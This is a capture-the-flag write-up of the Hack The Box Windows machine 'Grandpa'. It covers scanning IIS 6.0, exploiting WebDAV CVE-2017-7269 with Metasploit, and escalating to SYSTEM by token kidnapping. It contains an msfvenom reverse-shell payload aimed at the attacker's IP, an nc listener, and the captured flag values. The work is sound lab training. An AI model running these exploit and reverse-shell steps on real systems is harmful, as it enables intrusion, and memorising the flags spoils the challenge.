+++
title = "Grandpa"
date = "2024-02-11"
description = "This is an easy Windows box."
[extra]
cover = "cover.png"
toc = true
+++

# Information

**Difficulty**: Easy

**OS**: Windows

**Release date**: 2017-04-12

**Created by**: [ch4p](https://app.hackthebox.com/users/1)

# Setup

I'll attack this box from a Kali Linux VM as the `root` user — not a great
practice security-wise, but it's a VM so it's alright. This way I won't have to
prefix some commands with `sudo`, which gets cumbersome in the long run.

I like to maintain consistency in my workflow for every box, so before starting
with the actual pentest, I'll prepare a few things:

1. I'll create a directory that will contain every file related to this box.
   I'll call it `workspace`, and it will be located at the root of my filesystem
   `/`.

1. I'll create a `server` directory in `/workspace`. Then, I'll use
   `httpsimpleserver` to create an HTTP server on port `80` and
   `impacket-smbserver` to create an SMB share named `server`. This will make
   files in this folder available over the Internet, which will be especially
   useful for transferring files to the target machine if need be!

1. I'll place all my tools and binaries into the `/workspace/server` directory.
   This will come in handy once we get a foothold, for privilege escalation and
   for pivoting inside the internal network.

I'll also strive to minimize the use of Metasploit, because it hides the
complexity of some exploits, and prefer a more manual approach when it's not too
much hassle. This way, I'll have a better understanding of the exploits I'm
running, and I'll have more control over what's happening on the machine.

Throughout this write-up, my machine's IP address will be `10.10.14.10`. The
commands ran on my machine will be prefixed with `❯` for clarity, and if I ever
need to transfer files or binaries to the target machine, I'll always place them
in the `/tmp` or `C:\tmp` folder to clean up more easily later on.

Now we should be ready to go!

# Host `10.10.10.14`

## Scanning

### Ports

As usual, let's start by initiating a port scan on Grandpa using a TCP SYN
`nmap` scan to assess its attack surface.

```sh
❯ nmap -sS "10.10.10.14" -p-
```

```
<SNIP>
PORT   STATE SERVICE
80/tcp open  http
<SNIP>
```

Let's also check the 500 most common UDP ports.

```sh
❯ nmap -sU "10.10.10.14" --top-ports "500"
```

```
<SNIP>
```

### Fingerprinting

Following the ports scans, let's gather more data about the service associated
with the open TCP port we found.

```sh
❯ nmap -sS "10.10.10.14" -p "80" -sV
```

```
<SNIP>
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
<SNIP>
```

Alright, so `nmap` managed to determine that Grandpa is running Windows.

### Scripts

Let's run `nmap`'s default scripts on the TCP service to see if they can find
additional information.

```sh
❯ nmap -sS "10.10.10.14" -p "80" -sC
```

```
<SNIP>
PORT   STATE SERVICE
80/tcp open  http
|_http-title: Under Construction
| http-webdav-scan: 
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|   Server Type: Microsoft-IIS/6.0
|   Server Date: Sun, 11 Feb 2024 12:47:10 GMT
|   WebDAV type: Unknown
|_  Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
<SNIP>
```

The `http-title` script detected that the website's homepage title is 'Under
Construction'.

Furthermore, the `http-webdav-scan` script found that a few WebDAV methods were
allowed.

## Services enumeration

### IIS

#### Fingerprinting

Let's use `whatweb` to fingerprint IIS's homepage.

```sh
❯ whatweb -a3 "http://10.10.10.14/" -v
```

```
WhatWeb report for http://10.10.10.14/
Status    : 200 OK
Title     : <None>
IP        : 10.10.10.14
Country   : RESERVED, ZZ

Summary   : HTTPServer[Microsoft-IIS/6.0], Microsoft-IIS[6.0][Under Construction], MicrosoftOfficeWebServer[5.0_Pub], UncommonHeaders[microsoftofficewebserver], X-Powered-By[ASP.NET]

Detected Plugins:
[ HTTPServer ]
        HTTP server header string. This plugin also attempts to 
        identify the operating system from the server header. 

        String       : Microsoft-IIS/6.0 (from server string)

[ Microsoft-IIS ]
        Microsoft Internet Information Services (IIS) for Windows 
        Server is a flexible, secure and easy-to-manage Web server 
        for hosting anything on the Web. From media streaming to 
        web application hosting, IIS's scalable and open 
        architecture is ready to handle the most demanding tasks. 

        Module       : Under Construction
        Module       : Under Construction
        Version      : 6.0
        Website     : http://www.iis.net/

[ MicrosoftOfficeWebServer ]
        Microsoft Office Web Server 

        Version      : 5.0_Pub
        Website     : http://microsoft.com/

[ UncommonHeaders ]
        Uncommon HTTP server headers. The blacklist includes all 
        the standard headers and many non standard but common ones. 
        Interesting but fairly common headers should have their own 
        plugins, eg. x-powered-by, server and x-aspnet-version. 
        Info about headers can be found at www.http-stats.com 

        String       : microsoftofficewebserver (from headers)

[ X-Powered-By ]
        X-Powered-By HTTP header 

        String       : ASP.NET (from x-powered-by string)

HTTP Headers:
        HTTP/1.1 200 OK
        Content-Length: 1433
        Content-Type: text/html
        Content-Location: http://10.10.10.14/iisstart.htm
        Last-Modified: Fri, 21 Feb 2003 15:48:30 GMT
        Accept-Ranges: bytes
        ETag: "05b3daec0d9c21:2f4"
        Server: Microsoft-IIS/6.0
        MicrosoftOfficeWebServer: 5.0_Pub
        X-Powered-By: ASP.NET
        Date: Sun, 11 Feb 2024 12:49:08 GMT
        Connection: close
```

It reveals that ASP.NET is used by the website.

#### Exploration

Let's browse to `http://10.10.10.14/`.

![IIS homepage](iis-homepage.png)

It reminds me of another box... [Granny](../granny/index.md)! The similarity of
their names is probably no coincidence.

However, it's not vulnerable to the same file upload vulnerability is
[Granny](../granny/index.md).

#### WebDAV

The `nmap` scripts we ran [earlier](#scripts) revealed that IIS was using
WebDAV, and a wealth of details on it. Let's use `davtest` to verify this:

```sh
❯ davtest -url "http://10.10.10.14/"
```

```
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://10.10.10.14
********************************************************
NOTE    Random string for this session: uiCPNSbB8uG
********************************************************
 Creating directory
MKCOL           FAIL
********************************************************
 Sending test files
PUT     shtml   FAIL
PUT     pl      FAIL
PUT     jhtml   FAIL
PUT     asp     FAIL
PUT     aspx    FAIL
PUT     php     FAIL
PUT     jsp     FAIL
PUT     cfm     FAIL
PUT     html    FAIL
PUT     cgi     FAIL
PUT     txt     FAIL

********************************************************
<SNIP>
```

Everything failed.

#### Known vulnerabilities

If we search [ExploitDB](https://www.exploit-db.com/) for `IIS 6.0`, we find
[Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow](https://www.exploit-db.com/exploits/41738)
([CVE-2017-7269](https://nvd.nist.gov/vuln/detail/CVE-2017-7269)).

## Foothold ([CVE-2017-7269](https://nvd.nist.gov/vuln/detail/CVE-2017-7269))

[CVE-2017-7269](https://nvd.nist.gov/vuln/detail/CVE-2017-7269) is a buffer
overflow vulnerability in Windows Server 2003 R2's IIS version `6.0`. The
vulnerability lies in the `ScStoragePathFromUrl` function of IIS' WebDAV
service. By sending a long enough header beginning with `If: <http://` in a
PROPFIND, an attacker can get RCE.

### Preparation

I'll use the Metasploit module
`exploit/windows/iis/iis_webdav_scstoragepathfromurl` to exploit this
vulnerability, since it's non-trivial to do by hand.

I'll set the `payload` to `payload/windows/shell_reverse_tcp`, the `RHOSTS` to
`10.10.10.14`, the `LHOST` to `10.10.14.10` and the `LPORT` to `9001`.

### Exploitation

No we can launch the exploit!

```sh
msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > run
```

```
<SNIP>
c:\windows\system32\inetsrv>
```

It went off without a hitch.

However, I don't like Metasploit's shell, so I'll open my own on port `9002`.
Unfortunately, Powershell doesn't exist on this box.

## Getting a lay of the land

If we run `whoami`, we see that we got a foothold as
`NT AUTHORITY\Network Service`.

### Architecture

What is Grandpa's architecture?

```bat
c:\windows\system32\inetsrv> reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v PROCESSOR_ARCHITECTURE
```

```
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment
    PROCESSOR_ARCHITECTURE    REG_SZ    x86
```

It's using x86. Let's keep that in mind to select the appropriate binaries.

### Version

Let's gather some information about the Windows version of Grandpa.

```bat
c:\windows\system32\inetsrv> reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v ProductName ^
    && reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v CurrentBuildNumber
```

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion
    ProductName    REG_SZ    Microsoft Windows Server 2003 R2


HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion
    CurrentBuildNumber    REG_SZ    3790
```

In fact, it's Windows Server 2003 R2 build `3790`.

### Hotfixes

Let's retrieve the list of installed hotfixes.

```bat
c:\windows\system32\inetsrv> for /f "tokens=7 delims=\" %a in ('reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Hotfix"') do @echo %a
```

```
Q147222
```

There's only one.

### Users

Let's enumerate all users.

```bat
c:\windows\system32\inetsrv> net localgroup "Users" | find /V "NT AUTHORITY"
```

```
<SNIP>
ASPNET
Harry
<SNIP>
```

There's `ASPNET` and `Harry`.

What about the administrators?

```bat
c:\windows\system32\inetsrv> net localgroup "Administrators" | find /V "NT AUTHORITY"
```

```
<SNIP>
Administrator
<SNIP>
```

There's only the built-in `Administrator`.

### Groups

Let's enumerate all groups.

```bat
c:\windows\system32\inetsrv> net localgroup
```

```
<SNIP>
*Administrators
*Backup Operators
*Distributed COM Users
*Guests
*HelpServicesGroup
*IIS_WPG
*Network Configuration Operators
*OWS_209498277_admin
*Performance Log Users
*Performance Monitor Users
*Power Users
*Print Operators
*Remote Desktop Users
*Replicator
*TelnetClients
*Users
<SNIP>
```

### NICs

Let's gather the list of connected NICs.

```bat
c:\windows\system32\inetsrv> ipconfig /all
```

```
Windows IP Configuration

   Host Name . . . . . . . . . . . . : granpa
   Primary Dns Suffix  . . . . . . . : 
   Node Type . . . . . . . . . . . . : Unknown
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No

Ethernet adapter Local Area Connection:

   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection
   Physical Address. . . . . . . . . : 00-50-56-B9-EF-62
   DHCP Enabled. . . . . . . . . . . : No
   IP Address. . . . . . . . . . . . : 10.10.10.14
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.10.2
   DNS Servers . . . . . . . . . . . : 10.10.10.2
```

There's just an Ethernet interface.

## System enumeration

### Access tokens

Let's retrieve the privileges associated with our current access token.

```bat
c:\windows\system32\inetsrv> whoami /priv
```

```
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAuditPrivilege              Generate security audits                  Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled
```

We have several privileges, including `SeImpersonatePrivilege`... exactly like
for [Granny](../granny/index.md)!

## Privilege escalation (Token kidnapping)

See
[this Granny's section](../granny/index.md#privilege-escalation-token-kidnapping)
for more information on this exploit.

### Preparation

I'll transfer `token_kidnapping.exe` to Grandpa.

I want to obtain a reverse shell, so I'll use `msfvenom` to create an executable
for that.

```sh
❯ msfvenom -p "windows/shell_reverse_tcp" LHOST="10.10.14.10" LPORT="9003" -f "exe" -o "/workspace/server/revshell.exe"
```

Once again, I'll transfer it to Grandpa.

The last thing to do is starting a listener on port `9003` to receive the
connection.

```sh
❯ rlwrap nc -lvnp "9003"
```

Now we should be ready to go!

### Exploitation

Let's use our exploit to obtain an elevated shell.

```bat
c:\windows\system32\inetsrv> C:\tmp\token_kidnapping.exe "C:\tmp\revshell.exe"
```

If we check our listener:

```
connect to [10.10.14.10] from (UNKNOWN) [10.10.10.14] 1036
<SNIP>
C:\WINDOWS\TEMP>
```

It caught the reverse shell!

## System enumeration

If we run `whoami`, we see that we're `NT AUTHORITY\SYSTEM`!

### Flags

If we check `Harry`'s Desktop folder, we find the user flag.

```bat
C:\WINDOWS\TEMP> type "C:\Documents and Settings\Harry\Desktop\user.txt"
```

```
bdff5ec67c3cff017f2bedc146a5d869
```

And as usual, we can find the root flag in `Administrator`'s Desktop folder.

```bat
C:\WINDOWS\TEMP> type "C:\Documents and Settings\Administrator\Desktop\root.txt"
```

```
9359e905a2c35f861f6a57cecf28bb7b
```

# Afterwords

![Success](success.png)

That's it for this box! 🎉

I rated both the user and root flags as 'Easy' to obtain. I lost a bit of time
trying to exploit WebDAV functionalities to get a foothold, like in
[Granny](../granny/index.md), but it was unsuccessful. It was easy to find a
valid CVE for this box though, and thanks to Metasploit extremely easy to
exploit. The privilege escalation is the same as for
[Granny](../granny/index.md), so it was trivial.

Thanks for reading!
